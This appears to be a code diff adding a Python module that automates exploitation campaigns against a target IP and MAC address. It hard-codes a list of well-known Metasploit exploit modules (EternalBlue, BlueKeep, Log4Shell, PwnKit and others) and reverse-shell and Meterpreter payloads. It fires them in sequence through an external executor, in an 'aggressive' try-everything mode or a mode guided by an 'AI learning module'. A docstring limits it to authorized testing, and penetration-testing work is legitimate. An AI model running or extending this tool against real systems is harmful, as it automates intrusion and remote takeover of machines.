@@ -1,0 +1,530 @@
+"""
+Automated Attack System with Campaign Management
+Orchestrates multi-exploit campaigns with AI guidance
+
+IMPORTANT: For authorized security testing only
+"""
+
+import uuid
+import threading
+import time
+from typing import Dict, List, Optional, Callable
+from datetime import datetime
+from collections import defaultdict
+import logging
+
+logging.basicConfig(level=logging.INFO)
+log = logging.getLogger(__name__)
+
+class AutomatedAttackSystem:
+    """
+    Manages automated exploitation campaigns against targets
+    Coordinates multiple exploit attempts with AI learning
+    """
+    
+    # Comprehensive exploit database organized by category
+    EXPLOIT_DATABASE = {
+        "windows": [
+            "exploit/windows/smb/ms17_010_eternalblue",
+            "exploit/windows/smb/ms08_067_netapi",
+            "exploit/windows/dcerpc/ms03_026_dcom",
+            "exploit/windows/smb/ms17_010_psexec",
+            "exploit/windows/local/ms10_015_kitrap0d",
+            "exploit/windows/local/bypassuac_eventvwr",
+            "exploit/windows/http/rejetto_hfs_exec",
+            "exploit/windows/fileformat/ms14_060_sandworm",
+            "exploit/windows/browser/ms13_080_cdisplaypointer",
+            "exploit/windows/smb/ms06_040_netapi",
+        ],
+        "linux": [
+            "exploit/linux/samba/is_known_pipename",
+            "exploit/linux/http/apache_mod_cgi_bash_env_exec",
+            "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec",
+            "exploit/linux/local/docker_daemon_privilege_escalation",
+            "exploit/linux/local/sudo_baron_samedit",
+            "exploit/linux/http/webmin_backdoor",
+            "exploit/linux/misc/distcc_exec",
+            "exploit/linux/ftp/proftp_sreplace",
+            "exploit/linux/http/drupal_drupalgeddon2",
+            "exploit/linux/ssh/sshexec",
+        ],
+        "macos": [
+            "exploit/osx/browser/safari_libtiff",
+            "exploit/osx/http/apache_continuum_cmd_exec",
+            "exploit/osx/local/vmware_fusion_privilege_escalation",
+            "exploit/osx/mdns/upnp_location",
+            "exploit/osx/misc/ufo_ai",
+        ],
+        "multi": [
+            "exploit/multi/handler",
+            "exploit/multi/http/struts2_content_type_ognl",
+            "exploit/multi/http/tomcat_mgr_upload",
+            "exploit/multi/http/apache_normalize_path_rce",
+            "exploit/multi/http/log4shell_header_injection",
+            "exploit/multi/ssh/sshexec",
+            "exploit/multi/misc/java_rmi_server",
+            "exploit/multi/http/jenkins_script_console",
+        ],
+        "services": [
+            "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+            "exploit/windows/ftp/ms09_053_ftpd_nlst",
+            "exploit/windows/mysql/mysql_mof",
+            "exploit/windows/http/apache_modjk_overflow",
+            "exploit/unix/ftp/vsftpd_234_backdoor",
+            "exploit/unix/http/pfsense_graph_injection_exec",
+        ]
+    }
+    
+    # Payload options for each platform
+    PAYLOADS = {
+        "windows": [
+            "windows/meterpreter/reverse_tcp",
+            "windows/meterpreter/reverse_https",
+            "windows/shell/reverse_tcp",
+            "windows/x64/meterpreter/reverse_tcp",
+            "windows/x64/shell/reverse_tcp",
+        ],
+        "linux": [
+            "linux/x86/meterpreter/reverse_tcp",
+            "linux/x64/meterpreter/reverse_tcp",
+            "linux/x86/shell/reverse_tcp",
+            "linux/x64/shell/reverse_tcp",
+        ],
+        "macos": [
+            "osx/x86/shell_reverse_tcp",
+            "osx/x64/shell_reverse_tcp",
+            "osx/x86/vforkshell/reverse_tcp",
+        ],
+        "multi": [
+            "generic/shell_reverse_tcp",
+            "generic/shell_bind_tcp",
+        ]
+    }
+    
+    def __init__(self, ai_learning_module, exploit_executor: Callable):
+        """
+        Initialize automated attack system
+        
+        Args:
+            ai_learning_module: Instance of PenetrationTestingAI
+            exploit_executor: Function to execute exploits (mac, exploit, payload) -> (success, error)
+        """
+        self.ai = ai_learning_module
+        self.exploit_executor = exploit_executor
+        
+        self.campaigns = {}  # campaign_id -> campaign data
+        self.active_threads = {}  # campaign_id -> thread
+        self.campaign_locks = defaultdict(threading.Lock)
+        
+        log.info("Automated Attack System initialized")
+        log.info(f"Exploit database: {self._count_exploits()} exploits loaded")
+    
+    def _count_exploits(self) -> int:
+        """Count total exploits in database"""
+        return sum(len(exploits) for exploits in self.EXPLOIT_DATABASE.values())
+    
+    def start_automated_campaign(self, target_mac: str, target_ip: str, 
+                                 os_guess: str = "Unknown", 
+                                 aggressive: bool = False) -> str:
+        """
+        Start an automated exploitation campaign
+        
+        Args:
+            target_mac: Target MAC address
+            target_ip: Target IP address
+            os_guess: Guessed operating system
+            aggressive: If True, try all exploits. If False, use AI guidance
+        
+        Returns:
+            campaign_id: Unique campaign identifier
+        """
+        
+        campaign_id = str(uuid.uuid4())
+        
+        # Determine exploit list
+        if aggressive:
+            exploit_list = self._get_all_exploits()
+        else:
+            exploit_list = self._get_targeted_exploits(os_guess, target_mac)
+        
+        # Create campaign
+        campaign = {
+            "id": campaign_id,
+            "target_mac": target_mac,
+            "target_ip": target_ip,
+            "os_guess": os_guess,
+            "aggressive": aggressive,
+            "status": "running",
+            "start_time": datetime.utcnow().isoformat(),
+            "end_time": None,
+            "exploits_to_try": exploit_list,
+            "total_exploits": len(exploit_list),
+            "completed_exploits": 0,
+            "successful_exploits": 0,
+            "failed_exploits": 0,
+            "skipped_exploits": 0,
+            "current_exploit": None,
+            "results": [],
+            "progress": 0.0
+        }
+        
+        self.campaigns[campaign_id] = campaign
+        
+        # Start campaign thread
+        thread = threading.Thread(
+            target=self._run_campaign,
+            args=(campaign_id,),
+            daemon=True
+        )
+        self.active_threads[campaign_id] = thread
+        thread.start()
+        
+        log.info(f"Campaign {campaign_id} started against {target_ip} "
+                f"({'aggressive' if aggressive else 'targeted'} mode)")
+        
+        return campaign_id
+    
+    def _get_all_exploits(self) -> List[Dict]:
+        """Get all exploits for aggressive mode"""
+        exploits = []
+        
+        for category, exploit_list in self.EXPLOIT_DATABASE.items():
+            payloads = self.PAYLOADS.get(category, self.PAYLOADS["multi"])
+            
+            for exploit in exploit_list:
+                for payload in payloads[:2]:  # Use first 2 payloads per exploit
+                    exploits.append({
+                        "exploit": exploit,
+                        "payload": payload,
+                        "category": category
+                    })
+        
+        return exploits
+    
+    def _get_targeted_exploits(self, os_guess: str, target_mac: str) -> List[Dict]:
+        """Get targeted exploit list based on OS and AI recommendations"""
+        
+        os_lower = os_guess.lower()
+        exploits = []
+        
+        # Get AI recommendation first
+        ai_recommendation = self.ai.recommend_exploit(target_mac, os_guess)
+        
+        if ai_recommendation:
+            # Add AI-recommended exploit first
+            exploit_name = ai_recommendation["exploit"]
+            payload = self.ai.recommend_payload(exploit_name)
+            
+            if not payload:
+                # Determine payload from exploit category
+                if "windows" in exploit_name:
+                    payload = self.PAYLOADS["windows"][0]
+                elif "linux" in exploit_name:
+                    payload = self.PAYLOADS["linux"][0]
+                elif "osx" in exploit_name or "macos" in exploit_name:
+                    payload = self.PAYLOADS["macos"][0]
+                else:
+                    payload = self.PAYLOADS["multi"][0]
+            
+            exploits.append({
+                "exploit": exploit_name,
+                "payload": payload,
+                "category": "ai_recommended",
+                "ai_confidence": ai_recommendation.get("confidence", "medium")
+            })
+        
+        # Add OS-specific exploits
+        if "windows" in os_lower:
+            category = "windows"
+        elif "linux" in os_lower:
+            category = "linux"
+        elif "mac" in os_lower or "osx" in os_lower:
+            category = "macos"
+        else:
+            category = "multi"
+        
+        # Get exploits for this OS
+        os_exploits = self.EXPLOIT_DATABASE.get(category, [])
+        payloads = self.PAYLOADS.get(category, self.PAYLOADS["multi"])
+        
+        # Add top exploits for this OS
+        for exploit in os_exploits[:10]:  # Limit to top 10
+            # Skip if already added by AI
+            if not any(e["exploit"] == exploit for e in exploits):
+                exploits.append({
+                    "exploit": exploit,
+                    "payload": payloads[0],  # Use primary payload
+                    "category": category
+                })
+        
+        # Add some multi-platform exploits
+        for exploit in self.EXPLOIT_DATABASE["multi"][:5]:
+            if not any(e["exploit"] == exploit for e in exploits):
+                exploits.append({
+                    "exploit": exploit,
+                    "payload": self.PAYLOADS["multi"][0],
+                    "category": "multi"
+                })
+        
+        return exploits
+    
+    def _run_campaign(self, campaign_id: str):
+        """
+        Run the campaign in a background thread
+        """
+        
+        campaign = self.campaigns[campaign_id]
+        target_mac = campaign["target_mac"]
+        
+        log.info(f"Campaign {campaign_id} execution started")
+        
+        for i, exploit_info in enumerate(campaign["exploits_to_try"]):
+            # Check if campaign was stopped
+            if campaign["status"] == "stopped":
+                log.info(f"Campaign {campaign_id} was stopped")
+                break
+            
+            exploit = exploit_info["exploit"]
+            payload = exploit_info["payload"]
+            
+            # Update current exploit
+            with self.campaign_locks[campaign_id]:
+                campaign["current_exploit"] = exploit
+            
+            log.info(f"Campaign {campaign_id}: Trying {exploit} with {payload}")
+            
+            # Check if AI suggests skipping this exploit
+            if not self.ai.should_retry_exploit(exploit, target_mac):
+                log.info(f"AI suggests skipping {exploit} (failed too many times)")
+                
+                result = {
+                    "exploit": exploit,
+                    "payload": payload,
+                    "status": "skipped",
+                    "timestamp": datetime.utcnow().isoformat(),
+                    "reason": "AI suggested skip (previous failures)"
+                }
+                
+                with self.campaign_locks[campaign_id]:
+                    campaign["results"].append(result)
+                    campaign["skipped_exploits"] += 1
+                    campaign["completed_exploits"] += 1
+                    campaign["progress"] = (campaign["completed_exploits"] / 
+                                          campaign["total_exploits"]) * 100
+                
+                continue
+            
+            # Execute exploit
+            try:
+                success, error_msg = self.exploit_executor(target_mac, exploit, payload)
+                
+                # Record result with AI
+                self.ai.record_exploit_attempt(
+                    exploit=exploit,
+                    payload=payload,
+                    target_mac=target_mac,
+                    success=success,
+                    error_msg=error_msg
+                )
+                
+                # Store result
+                result = {
+                    "exploit": exploit,
+                    "payload": payload,
+                    "status": "success" if success else "failed",
+                    "timestamp": datetime.utcnow().isoformat(),
+                    "error": error_msg if not success else None
+                }
+                
+                with self.campaign_locks[campaign_id]:
+                    campaign["results"].append(result)
+                    
+                    if success:
+                        campaign["successful_exploits"] += 1
+                        log.info(f"✓ Campaign {campaign_id}: SUCCESS with {exploit}")
+                        
+                        # In targeted mode, stop after first success
+                        if not campaign["aggressive"]:
+                            log.info(f"Campaign {campaign_id}: First success achieved, stopping")
+                            campaign["status"] = "completed"
+                            break
+                    else:
+                        campaign["failed_exploits"] += 1
+                        log.warning(f"✗ Campaign {campaign_id}: FAILED {exploit} - {error_msg}")
+                    
+                    campaign["completed_exploits"] += 1
+                    campaign["progress"] = (campaign["completed_exploits"] / 
+                                          campaign["total_exploits"]) * 100
+                
+                # Small delay between attempts
+                time.sleep(2)
+                
+            except Exception as e:
+                log.error(f"Campaign {campaign_id}: Exception during exploit: {e}")
+                
+                result = {
+                    "exploit": exploit,
+                    "payload": payload,
+                    "status": "error",
+                    "timestamp": datetime.utcnow().isoformat(),
+                    "error": str(e)
+                }
+                
+                with self.campaign_locks[campaign_id]:
+                    campaign["results"].append(result)
+                    campaign["failed_exploits"] += 1
+                    campaign["completed_exploits"] += 1
+                    campaign["progress"] = (campaign["completed_exploits"] / 
+                                          campaign["total_exploits"]) * 100
+        
+        # Campaign completed
+        with self.campaign_locks[campaign_id]:
+            if campaign["status"] != "stopped":
+                campaign["status"] = "completed"
+            campaign["end_time"] = datetime.utcnow().isoformat()
+            campaign["current_exploit"] = None
+        
+        log.info(f"Campaign {campaign_id} finished: "
+                f"{campaign['successful_exploits']}/{campaign['total_exploits']} successful")
+    
+    def stop_campaign(self, campaign_id: str) -> bool:
+        """
+        Stop a running campaign
+        
+        Returns:
+            True if stopped, False if not found or already stopped
+        """
+        
+        if campaign_id not in self.campaigns:
+            return False
+        
+        campaign = self.campaigns[campaign_id]
+        
+        with self.campaign_locks[campaign_id]:
+            if campaign["status"] == "running":
+                campaign["status"] = "stopped"
+                campaign["end_time"] = datetime.utcnow().isoformat()
+                log.info(f"Campaign {campaign_id} stopped by user")
+                return True
+        
+        return False
+    
+    def get_campaign_status(self, campaign_id: str) -> Optional[Dict]:
+        """
+        Get current status of a campaign
+        
+        Returns:
+            Status dict or None if not found
+        """
+        
+        if campaign_id not in self.campaigns:
+            return None
+        
+        campaign = self.campaigns[campaign_id]
+        
+        with self.campaign_locks[campaign_id]:
+            return {
+                "campaign_id": campaign["id"],
+                "target_ip": campaign["target_ip"],
+                "target_mac": campaign["target_mac"],
+                "os_guess": campaign["os_guess"],
+                "status": campaign["status"],
+                "progress": round(campaign["progress"], 2),
+                "total": campaign["total_exploits"],
+                "completed": campaign["completed_exploits"],
+                "successful": campaign["successful_exploits"],
+                "failed": campaign["failed_exploits"],
+                "skipped": campaign["skipped_exploits"],
+                "current_exploit": campaign["current_exploit"],
+                "start_time": campaign["start_time"],
+                "end_time": campaign["end_time"]
+            }
+    
+    def get_campaign_results(self, campaign_id: str) -> Optional[Dict]:
+        """
+        Get detailed results of a campaign
+        
+        Returns:
+            Results dict or None if not found
+        """
+        
+        if campaign_id not in self.campaigns:
+            return None
+        
+        campaign = self.campaigns[campaign_id]
+        
+        with self.campaign_locks[campaign_id]:
+            return {
+                "id": campaign["id"],
+                "target_ip": campaign["target_ip"],
+                "target_mac": campaign["target_mac"],
+                "os_guess": campaign["os_guess"],
+                "aggressive_mode": campaign["aggressive"],
+                "status": campaign["status"],
+                "start_time": campaign["start_time"],
+                "end_time": campaign["end_time"],
+                "total_exploits": campaign["total_exploits"],
+                "successful_exploits": campaign["successful_exploits"],
+                "failed_exploits": campaign["failed_exploits"],
+                "skipped_exploits": campaign["skipped_exploits"],
+                "results": list(campaign["results"])  # Copy list
+            }
+    
+    def list_active_campaigns(self) -> List[Dict]:
+        """List all campaigns with their current status"""
+        
+        campaigns = []
+        
+        for campaign_id, campaign in self.campaigns.items():
+            with self.campaign_locks[campaign_id]:
+                campaigns.append({
+                    "campaign_id": campaign["id"],
+                    "target_ip": campaign["target_ip"],
+                    "status": campaign["status"],
+                    "progress": round(campaign["progress"], 2),
+                    "successful": campaign["successful_exploits"],
+                    "start_time": campaign["start_time"]
+                })
+        
+        return campaigns
+    
+    def get_exploit_database_info(self) -> Dict:
+        """Get information about the exploit database"""
+        
+        return {
+            "total_exploits": self._count_exploits(),
+            "categories": {
+                category: len(exploits)
+                for category, exploits in self.EXPLOIT_DATABASE.items()
+            },
+            "payloads": {
+                platform: len(payloads)
+                for platform, payloads in self.PAYLOADS.items()
+            }
+        }
+    
+    def cleanup_old_campaigns(self, max_age_hours: int = 24):
+        """Remove campaigns older than specified hours"""
+        
+        current_time = datetime.utcnow()
+        to_remove = []
+        
+        for campaign_id, campaign in self.campaigns.items():
+            if campaign["status"] in ["completed", "stopped"]:
+                start_time = datetime.fromisoformat(campaign["start_time"])
+                age_hours = (current_time - start_time).total_seconds() / 3600
+                
+                if age_hours > max_age_hours:
+                    to_remove.append(campaign_id)
+        
+        for campaign_id in to_remove:
+            del self.campaigns[campaign_id]
+            if campaign_id in self.active_threads:
+                del self.active_threads[campaign_id]
+            if campaign_id in self.campaign_locks:
+                del self.campaign_locks[campaign_id]
+        
+        if to_remove:
+            log.info(f"Cleaned up {len(to_remove)} old campaigns")
+        
+        return len(to_remove)
